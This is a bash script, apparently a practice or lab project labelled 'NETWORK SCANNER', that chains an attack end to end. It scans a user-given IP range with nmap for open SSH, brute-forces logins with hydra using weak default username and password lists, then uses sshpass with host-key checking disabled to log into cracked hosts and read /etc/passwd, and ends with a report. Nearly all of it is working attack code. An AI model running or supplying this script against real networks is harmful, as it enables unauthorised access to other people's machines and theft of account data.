#!/bin/bash
clear
echo "================================"
echo "      "NETWORK SCANNER"         " 
echo "================================"


function INSERT ()
{		
echo "Enter IP range or subnet (e.g., 192.168.181.0/24):"
#Inserting the IP we want to scan .

read ip_range 
#Checking the IP range .

echo "Scanning: $ip_range"
#Scanning the IP range .
NMAPCHECK=$(nmap -sL $ip_range | head -n 2 | tail -n 1 | awk '{print $2}')  
if [ "$NMAPCHECK" == "scan" ]
then
echo "Valid IP, we can move forward" 
else 
echo "Invalid IP ."
echo "Going back to inserting"
sleep 3 #wait 3 seconds .
INSERT 
fi
} 
INSERT 
function NMAP ()
{
	nmap "$ip_range" -p 22 --open -Pn | grep report | awk '{print $NF}' > ip.txt 
    echo "Scanning SSH Service"
}
NMAP
function USER () 
{
	echo "1.Upload a username list" 
echo "2. i will upload my own username list"
read username
case $username in
1) read -p "specify the name of the file :" filename
echo "uploading the list called :" 
echo "$filename"
cp "$filename" user.txt
cat user.txt
;;
2) echo "Using the default lists"
cat > user.txt <<abc 
kali
noam
123
msfadmin
1
windows
chair
linux
computer
abc
esac
}
USER
function brute ()
{
	echo "1.Upload a passlist" 
echo "2. i will use a default one"
read Brute

case $Brute in
1) read -p "specify the name of the file :" filename
echo "uploading the list called :" 
echo "$filename"
cp "$filename" pass.txt
cat pass.txt
;;
2) echo "Using the default lists"
cat > pass.txt <<abc 
kali
noam
123
msfadmin
1
windows
chair
linux
computer
abc
esac 


# Brute forcing section
while read ip; do
    echo "Trying to brute force: $ip"
    hydra -t 4 -L user.txt -P pass.txt -M ip.txt -s 22 ssh 2>/dev/null | grep 'host' > successful_logins.txt
    
    cat successful_logins.txt
done < ip.txt

echo "Brute force complete! Check successful_logins.txt"
}
brute

function exploit ()
{
    echo "Starting post-exploitation..."
    
    # Check if file exists and has content
    if [ ! -f successful_logins.txt ] || [ ! -s successful_logins.txt ]; then
        echo "No successful logins found. Skipping exploitation."
        return
    fi
    
    # Read each successful login from the file
        # Extract IP, username, and password from hydra output
        ip=$(cat successful_logins.txt | awk '{print $3}')
        user=$(cat successful_logins.txt | awk '{print $5}')
        pass=$(cat successful_logins.txt | awk '{print $7}')
       
        
        echo "Exploiting $ip with user: $user"
        
        # Run command on remote machine non-interactively
        echo "ip $ip"
        echo "user $user"
        echo "password $pass"
        sshpass -p "$pass" ssh -o StrictHostKeyChecking=no "$user"@"$ip" "cat /etc/passwd | tail -n1 | awk -F ':' '{print $1}'" > poc.txt
       #cat poc.txt | awk -F ':' '{print $1}' > poc.txt

        echo "Command executed on $ip"
        
    echo "Post-exploitation complete!"
}
exploit


function report ()
{
    echo "=========================================="
    echo "           FINAL REPORT                   "
    echo "=========================================="
    echo ""
    
   
    
    # Check if file exists and has content
    if [ ! -f successful_logins.txt ] || [ ! -s successful_logins.txt ]; then
        echo "No hosts were successfully accessed."
        echo "Brute force attack found no valid credentials."
    else
        echo "Successfully accessed hosts:"
        cat successful_logins.txt
        echo ""
        echo "Commands executed: $(cat poc.txt)"
    fi
    
    echo ""
    echo "Report complete!"
}
report
